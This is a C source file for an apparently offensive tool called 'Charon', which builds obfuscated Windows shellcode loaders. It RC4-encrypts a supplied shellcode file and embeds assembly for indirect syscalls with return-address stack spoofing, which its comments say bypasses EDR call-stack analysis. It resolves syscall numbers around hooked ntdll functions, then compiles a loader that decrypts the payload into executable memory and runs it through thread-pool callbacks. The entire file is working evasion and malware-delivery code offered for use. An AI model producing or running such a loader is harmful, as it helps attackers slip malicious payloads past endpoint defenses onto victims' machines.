#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>

// =================================================================================
//  PART 1: EMBEDDED ASSEMBLY (STACK SPOOFER & INDIRECT SYSCALL)
// =================================================================================
// This assembly block implements the "RBX Trampoline" technique.
// It spoofs the return address on the stack to make it look like the syscall 
// was triggered by a legitimate "JMP RBX" gadget inside kernel32.dll/ntdll.dll,
// bypassing EDR Call Stack analysis.
const char *g_HellHallAsm = 
    "EXTERN wSystemCall:DWORD\n"
    "EXTERN qSyscallInsAddress:QWORD\n"
    "EXTERN qGadgetAddress:QWORD\n"
    "EXTERN qSavedRbx:QWORD\n"
    "EXTERN qSavedRetAddr:QWORD\n"
    ".code\n"
    "    RunSyscall proc\n"
    "        ; [1] PRESERVE CONTEXT\n"
    "        ; RBX is a non-volatile register. The caller expects it unchanged.\n"
    "        ; We save it globally because we need to use RBX for the trampoline.\n"
    "        mov qSavedRbx, rbx\n"
    "\n"
    "        ; [2] SAVE ORIGINAL RETURN ADDRESS\n"
    "        ; We pop the real return address (back to our C main) from the stack.\n"
    "        ; We must save it globally because the Syscall will overwrite RAX with NTSTATUS.\n"
    "        pop rax\n"
    "        mov qSavedRetAddr, rax\n"
    "\n"
    "        ; [3] SPOOF THE STACK\n"
    "        ; We push the address of a 'JMP RBX' gadget (found in a legit DLL).\n"
    "        ; When the kernel function returns, it will pop this address and jump to it.\n"
    "        push qGadgetAddress\n"
    "\n"
    "        ; [4] PREPARE TRAMPOLINE\n"
    "        ; The gadget does 'JMP RBX'. So we set RBX to point to our cleanup label.\n"
    "        lea rbx, BackFromKernel\n"
    "\n"
    "        ; [5] SETUP SYSCALL ARGUMENTS\n"
    "        ; Windows x64 syscall convention requires RCX -> R10.\n"
    "        mov r10, rcx\n"
    "\n"
    "        ; [6] EXECUTE INDIRECT SYSCALL\n"
    "        ; Load the SSN into EAX.\n"
    "        mov eax, wSystemCall\n"
    "        ; Jump to a clean 'syscall; ret' instruction inside ntdll.dll.\n"
    "        mov r11, qSyscallInsAddress\n"
    "        jmp r11\n"
    "\n"
    "    BackFromKernel:\n"
    "        ; [7] RESTORE CONTEXT\n"
    "        ; The gadget jumped here via RBX.\n"
    "        ; Restore the original RBX value.\n"
    "        mov rbx, qSavedRbx\n"
    "\n"
    "        ; [8] RETURN TO CALLER\n"
    "        ; Retrieve the original return address we saved in step [2].\n"
    "        mov r11, qSavedRetAddr\n"
    "        jmp r11\n"
    "    RunSyscall endp\n"
    "end\n";

// =================================================================================
//  PART 2: MONOLITHIC C TEMPLATE (THE ARTIFACT)
// =================================================================================
const char *g_StubTemplate =
    "#include <windows.h>\n"
    "#include <stdio.h>\n"
    "\n"
    "// --- [SECTION 1] GLOBALS FOR ASM ---\n"
    "// These variables are accessed via EXTERN in the assembly code.\n"
    "DWORD wSystemCall = 0;\n"
    "void* qSyscallInsAddress = NULL;\n"
    "void* qGadgetAddress = NULL;\n"
    "void* qSavedRbx = NULL;\n"
    "void* qSavedRetAddr = NULL;\n"
    "\n"
    "// --- [SECTION 2] INTERNAL STRUCTS ---\n"
    "typedef struct _USTRING { DWORD Length; DWORD MaximumLength; PVOID Buffer; } USTRING, *PUSTRING;\n"
    "typedef struct _PEB_LDR_DATA { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;\n"
    "typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;\n"
    "typedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; union { BOOLEAN BitField; PVOID BitFieldPlace; }; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA Ldr; } PEB, *PPEB;\n"
    "\n"
    "// --- [SECTION 3] HELPERS ---\n"
    "// Compile-time hash calculation helper\n"
    "DWORD CRC32B(LPCSTR string) {\n"
    "    DWORD mask = 0;\n"
    "    DWORD state = 0xFFFFFFFF;\n"
    "    unsigned int byte;\n"
    "    while ((byte = *string++) != 0) {\n"
    "        state = state ^ byte;\n"
    "        for (int j = 0; j < 8; j++) {\n"
    "            mask = -(int)(state & 1);\n"
    "            state = (state >> 1) ^ (0xEDB88320 & mask);\n"
    "        }\n"
    "    }\n"
    "    return ~state;\n"
    "}\n"
    "#define HASH(x) CRC32B(x)\n"
    "\n"
    "// Hunt for a clean 'syscall; ret' (0F 05 C3) instruction in ntdll.dll\n"
    "PVOID FindSyscallStub() {\n"
    "    PVOID pModule = (PVOID)GetModuleHandleA(\"ntdll.dll\");\n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModule + pDos->e_lfanew);\n"
    "    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);\n"
    "\n"
    "    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n"
    "        if (pSection[i].Characteristics & 0x20000020) { // Check for Executable section\n"
    "            PBYTE pStart = (PBYTE)((ULONG_PTR)pModule + pSection[i].VirtualAddress);\n"
    "            DWORD dwSize = pSection[i].Misc.VirtualSize;\n"
    "            for (DWORD z = 0; z < dwSize - 2; z++) {\n"
    "                if (pStart[z] == 0x0F && pStart[z+1] == 0x05 && pStart[z+2] == 0xC3) {\n"
    "                    return (PVOID)(pStart + z);\n"
    "                }\n"
    "            }\n"
    "        }\n"
    "    }\n"
    "    return NULL;\n"
    "}\n"
    "\n"
    "// Hunt for a 'JMP RBX' (FF E3) gadget in the .text section of a module\n"
    "PVOID FindGadgetInModule(const char* sModule) {\n"
    "    PVOID pModule = (PVOID)GetModuleHandleA(sModule);\n"
    "    if (!pModule) return NULL;\n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModule + pDos->e_lfanew);\n"
    "    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);\n"
    "    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n"
    "        if (pSection[i].Characteristics & 0x20000020) {\n"
    "            PBYTE pStart = (PBYTE)((ULONG_PTR)pModule + pSection[i].VirtualAddress);\n"
    "            DWORD dwSize = pSection[i].Misc.VirtualSize;\n"
    "            for (DWORD z = 0; z < dwSize - 1; z++) {\n"
    "                if (pStart[z] == 0xFF && pStart[z+1] == 0xE3) return (PVOID)(pStart + z);\n"
    "            }\n"
    "        }\n"
    "    }\n"
    "    return NULL;\n"
    "}\n"
    "\n"
    "// Resolve SSN using Tartarus Gate logic (Handles Hooked functions)\n"
    "BOOL GetSSN(DWORD dwHash, DWORD* outSSN) {\n"
    "    PVOID g_NtdllBase = (PVOID)GetModuleHandleA(\"ntdll.dll\");\n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)g_NtdllBase;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)g_NtdllBase + pDos->e_lfanew);\n"
    "    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)g_NtdllBase + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);\n"
    "    PDWORD pdwNames = (PDWORD)((ULONG_PTR)g_NtdllBase + pExport->AddressOfNames);\n"
    "    PDWORD pdwAddrs = (PDWORD)((ULONG_PTR)g_NtdllBase + pExport->AddressOfFunctions);\n"
    "    PWORD pwOrds = (PWORD)((ULONG_PTR)g_NtdllBase + pExport->AddressOfNameOrdinals);\n"
    "\n"
    "    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {\n"
    "        char* szName = (char*)((ULONG_PTR)g_NtdllBase + pdwNames[i]);\n"
    "        if (HASH(szName) == dwHash) {\n"
    "            PVOID pFunc = (PVOID)((ULONG_PTR)g_NtdllBase + pdwAddrs[pwOrds[i]]);\n"
    "            PBYTE pBytes = (PBYTE)pFunc;\n"
    "            \n"
    "            // 1. Check if function is clean (starts with: mov r10, rcx; mov eax, SSN)\n"
    "            if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1 && pBytes[3] == 0xB8) {\n"
    "               *outSSN = ((pBytes[5] << 8) | pBytes[4]); \n"
    "               return TRUE;\n"
    "            }\n"
    "            \n"
    "            // 2. If hooked (starts with JMP/E9), use Tartarus Gate to check neighbors\n"
    "            for (int z = 1; z < 32; z++) {\n"
    "                if (pBytes[z*32] == 0x4C && pBytes[z*32+1] == 0x8B && pBytes[z*32+3] == 0xB8) {\n"
    "                    *outSSN = ((pBytes[z*32+5] << 8) | pBytes[z*32+4]) - z; \n"
    "                    return TRUE;\n"
    "                }\n"
    "                if (pBytes[z*-32] == 0x4C && pBytes[z*-32+1] == 0x8B && pBytes[z*-32+3] == 0xB8) {\n"
    "                    *outSSN = ((pBytes[z*-32+5] << 8) | pBytes[z*-32+4]) + z; \n"
    "                    return TRUE;\n"
    "                }\n"
    "            }\n"
    "            return FALSE;\n"
    "        }\n"
    "    }\n"
    "    return FALSE;\n"
    "}\n"
    "\n"
    "// Linkage to Assembly\n"
    "extern NTSTATUS RunSyscall();\n"
    "\n"
    "// --- [SECTION 4] CONFIG & PAYLOAD ---\n"
    "#define KEY_SIZE 16\n"
    "#define HINT_BYTE {{HINT_BYTE}}\n"
    "#define NtAllocateVirtualMemory_CRC32   0xE0762FEB\n"
    "#define NtProtectVirtualMemory_CRC32    0x5C2D1A97\n"
    "\n"
    "unsigned char Payload[] = { {{PAYLOAD_BYTES}} };\n"
    "unsigned char Key[] = { {{KEY_BYTES}} };\n"
    "\n"
    "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
    "\n"
    "// Function Prototypes for Stack Argument Safety\n"
    "typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
    "typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
    "typedef NTSTATUS (NTAPI *fnTpAllocWork)(PVOID*, PVOID, PVOID, PVOID);\n"
    "typedef NTSTATUS (NTAPI *fnTpPostWork)(PVOID);\n"
    "typedef NTSTATUS (NTAPI *fnTpWaitForWork)(PVOID, BOOLEAN);\n"
    "typedef NTSTATUS (NTAPI *fnTpReleaseWork)(PVOID);\n"
    "\n"
    "int main() {\n"
    "    PVOID pAddr = NULL; SIZE_T sSize = sizeof(Payload); DWORD dwOld = 0; HANDLE hProc = (HANDLE)-1;\n"
    "\n"
    "    printf(\"[+] Initializing Charon Loader...\\n\");\n"
    "\n"
    "    // 1. Hunt for Stack Spoofing Gadget\n"
    "    qGadgetAddress = FindGadgetInModule(\"kernel32.dll\");\n"
    "    if(!qGadgetAddress) qGadgetAddress = FindGadgetInModule(\"ntdll.dll\");\n"
    "    if(!qGadgetAddress) { printf(\"[!] Critical: 'JMP RBX' gadget not found.\\n\"); getchar(); return -1; }\n"
    "\n"
    "    // 2. Hunt for Indirect Syscall Stub\n"
    "    qSyscallInsAddress = FindSyscallStub();\n"
    "    if(!qSyscallInsAddress) { printf(\"[!] Critical: 'syscall; ret' stub not found.\\n\"); getchar(); return -1; }\n"
    "\n"
    "    printf(\"[+] Stack Spoofer Ready (Gadget: 0x%p | Stub: 0x%p)\\n\", qGadgetAddress, qSyscallInsAddress);\n"
    "\n"
    "    // 3. Resolve SSNs\n"
    "    DWORD ssnAlloc = 0; DWORD ssnProtect = 0;\n"
    "    if(!GetSSN(NtAllocateVirtualMemory_CRC32, &ssnAlloc)) { printf(\"[!] Failed to resolve NtAllocate SSN\\n\"); getchar(); return -2; }\n"
    "    if(!GetSSN(NtProtectVirtualMemory_CRC32, &ssnProtect)) { printf(\"[!] Failed to resolve NtProtect SSN\\n\"); getchar(); return -3; }\n"
    "\n"
    "    // 4. Allocate Memory (Indirect Syscall + Stack Spoof)\n"
    "    printf(\"[+] Allocating payload memory...\\n\");\n"
    "    wSystemCall = ssnAlloc;\n"
    "    NTSTATUS status = ((fnNtAllocateVirtualMemory)RunSyscall)(hProc, &pAddr, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
    "    if(status != 0) { printf(\"[!] Allocation Failed: 0x%X\\n\", status); getchar(); return -1; }\n"
    "\n"
    "    // 5. Decrypt Payload (SystemFunction032 / RC4)\n"
    "    printf(\"[+] Decrypting payload...\\n\");\n"
    "    int b = 0; while(((Key[0]^b)-0) != HINT_BYTE) b++; // Brute-force key guard\n"
    "    for(int i=0; i<KEY_SIZE; i++) Key[i] = (BYTE)((Key[i]^b)-i);\n"
    "    USTRING k = {KEY_SIZE, KEY_SIZE, Key}; USTRING d = {sSize, sSize, Payload};\n"
    "    fnSystemFunction032 Decrypt = (fnSystemFunction032)GetProcAddress(LoadLibraryA(\"Advapi32\"), \"SystemFunction032\");\n"
    "    memcpy(pAddr, Payload, sizeof(Payload));\n"
    "    d.Buffer = pAddr;\n"
    "    Decrypt(&d, &k);\n"
    "\n"
    "    // 6. Protect Memory (RX)\n"
    "    printf(\"[+] Changing permissions to RX...\\n\");\n"
    "    wSystemCall = ssnProtect;\n"
    "    status = ((fnNtProtectVirtualMemory)RunSyscall)(hProc, &pAddr, &sSize, PAGE_EXECUTE_READ, &dwOld);\n"
    "    if(status != 0) { printf(\"[!] NtProtect Failed: 0x%X\\n\", status); getchar(); return -1; }\n"
    "\n"
    "    // 7. Execute via Thread Pool (Injection)\n"
    "    printf(\"[+] Execution handed over to Thread Pool.\\n\");\n"
    "    HMODULE hNt = GetModuleHandleA(\"ntdll.dll\");\n"
    "    fnTpAllocWork TpAlloc = (fnTpAllocWork)GetProcAddress(hNt, \"TpAllocWork\");\n"
    "    fnTpPostWork TpPost = (fnTpPostWork)GetProcAddress(hNt, \"TpPostWork\");\n"
    "    PVOID pWork = NULL;\n"
    "    TpAlloc(&pWork, pAddr, NULL, NULL);\n"
    "    TpPost(pWork);\n"
    "    ((fnTpWaitForWork)GetProcAddress(hNt, \"TpWaitForWork\"))(pWork, FALSE);\n"
    "    ((fnTpReleaseWork)GetProcAddress(hNt, \"TpReleaseWork\"))(pWork);\n"
    "\n"
    "    printf(\"[+] Finished. Press Enter to exit.\\n\");\n"
    "    getchar();\n"
    "    return 0;\n"
    "}\n";

// =================================================================================
//  PART 3: BUILDER LOGIC
// =================================================================================

// Struct for local RC4 encryption
typedef struct _USTRING_BUILDER {
  DWORD Length;
  DWORD MaximumLength;
  PVOID Buffer;
} USTRING;
typedef NTSTATUS(NTAPI *fnSystemFunction032)(USTRING *Img, USTRING *Key);

// Use Windows internal function for consistency
void RC4_Encrypt(unsigned char *key, DWORD keySize, unsigned char *data, DWORD dataSize) {
  HMODULE hAdvapi = LoadLibraryA("Advapi32.dll");
  if (!hAdvapi) return;
  fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(hAdvapi, "SystemFunction032");
  if (SystemFunction032) {
    USTRING uKey = {keySize, keySize, key};
    USTRING uData = {dataSize, dataSize, data};
    SystemFunction032(&uData, &uKey);
  }
  FreeLibrary(hAdvapi);
}

// IO Helper: Read binary file
unsigned char *ReadFileBytes(const char *filename, DWORD *outSize) {
  FILE *f = fopen(filename, "rb");
  if (!f) return NULL;
  fseek(f, 0, SEEK_END);
  long size = ftell(f);
  rewind(f);
  unsigned char *buffer = (unsigned char *)malloc(size);
  if (buffer) fread(buffer, 1, size, f);
  fclose(f);
  *outSize = (DWORD)size;
  return buffer;
}

// IO Helper: Convert bytes to C hex string
char *BytesToHexString(unsigned char *data, DWORD size) {
  char *hexStr = (char *)malloc(size * 6 + 10);
  if (!hexStr) return NULL;
  char *ptr = hexStr;
  for (DWORD i = 0; i < size; i++) {
    if (i < size - 1) ptr += sprintf(ptr, "0x%02X, ", data[i]);
    else ptr += sprintf(ptr, "0x%02X", data[i]);
  }
  return hexStr;
}

// String Helper: Replace pattern in template
char *ReplacePattern(const char *original, const char *pattern, const char *replacement) {
  if (!original || !pattern || !replacement) return NULL;
  int newWlen = strlen(replacement);
  int oldWlen = strlen(pattern);
  int cnt = 0;
  const char *p = original;
  while ((p = strstr(p, pattern))) { cnt++; p += oldWlen; }

  size_t newSize = strlen(original) + cnt * (newWlen - oldWlen) + 1;
  char *result = (char *)malloc(newSize);
  if (!result) return NULL;

  char *dest = result;
  p = original;
  const char *found;
  while ((found = strstr(p, pattern))) {
    size_t len = found - p;
    memcpy(dest, p, len);
    dest += len;
    memcpy(dest, replacement, newWlen);
    dest += newWlen;
    p = found + oldWlen;
  }
  strcpy(dest, p);
  return result;
}

int main(int argc, char *argv[]) {

  printf("\n"
         "   _____ _    _          _____  ____  _   _ \n"
         "  / ____| |  | |   /\\   |  __ \\|  _ \\| \\ | |\n"
         " | |    | |__| |  /  \\  | |__) | | | |  \\| |\n"
         " | |    |  __  | / /\\ \\ |  _  /| | | | . ` |\n"
         " | |____| |  | |/ ____ \\| | \\ \\| |_| | |\\  |\n"
         "  \\_____|_|  |_/_/    \\_\\_|  \\_\\____/|_| \\_|\n"
         "        Artifact Builder & Obfuscator        \n"
         "\n");

  if (argc < 2) {
    printf("Usage: Charon.exe <shellcode_file>\n");
    return 1;
  }

  srand((unsigned int)time(NULL));
  const char *shellcodeFile = argv[1];

  // 1. Read Payload
  printf("[*] Reading Shellcode: %s\n", shellcodeFile);
  DWORD shellcodeSize = 0;
  unsigned char *shellcode = ReadFileBytes(shellcodeFile, &shellcodeSize);
  if (!shellcode) { printf("[!] Failed to read file.\n"); return 1; }

  // 2. Encrypt Payload
  printf("[*] Encrypting (RC4 + KeyGuard)...\n");
  unsigned char realKey[16], protectedKey[16];
  for (int i = 0; i < 16; i++) realKey[i] = rand() % 255;
  RC4_Encrypt(realKey, 16, shellcode, shellcodeSize);

  // Apply KeyGuard (Brute-force protection)
  unsigned char b = (rand() % 200) + 1;
  for (int i = 0; i < 16; i++) protectedKey[i] = (unsigned char)((realKey[i] + i) ^ b);
  unsigned char hintByte = protectedKey[0] ^ b;
  printf("    -> Generated Secret: 0x%02X | Hint: 0x%02X\n", b, hintByte);

  // Convert to strings
  char *sPayload = BytesToHexString(shellcode, shellcodeSize);
  char *sKey = BytesToHexString(protectedKey, 16);
  char sHint[10]; sprintf(sHint, "0x%02X", hintByte);

  // 3. Write ASM File
  printf("[*] Dropping temporary assembly file (syscalls.asm)...\n");
  FILE *fAsm = fopen("syscalls.asm", "w");
  if (fAsm) { fputs(g_HellHallAsm, fAsm); fclose(fAsm); }

  // 4. Assemble
  printf("[*] Assembling (ML64)...\n");
  if (system("ml64 /c /Cx /nologo syscalls.asm") != 0) {
    printf("[!] Assembly failed. Ensure MSVC/ML64 is in PATH.\n");
    return 1;
  }

  // 5. Generate C Source
  printf("[*] Generating Monolithic C source (artifact.c)...\n");
  char *step1 = ReplacePattern(g_StubTemplate, "{{HINT_BYTE}}", sHint);
  char *step2 = ReplacePattern(step1, "{{PAYLOAD_BYTES}}", sPayload);
  char *finalSource = ReplacePattern(step2, "{{KEY_BYTES}}", sKey);

  FILE *fC = fopen("artifact.c", "w");
  if (fC) { fputs(finalSource, fC); fclose(fC); }

  // 6. Compile
  printf("[*] Compiling Artifact (CL)...\n");
  int res = system("cl /nologo /O2 artifact.c syscalls.obj /Fe:CharonArtifact.exe /link /CETCOMPAT:NO");

  // 7. Cleanup
  printf("[*] Cleaning up temp files...\n");
  system("del syscalls.asm syscalls.obj artifact.c artifact.obj >NUL 2>&1");
  free(step1); free(step2); free(finalSource); free(sPayload); free(sKey); free(shellcode);

  if (res == 0) printf("\n[+] SUCCESS: CharonArtifact.exe created.\n");
  else printf("\n[!] FAILURE: Compilation error.\n");

  return 0;
}
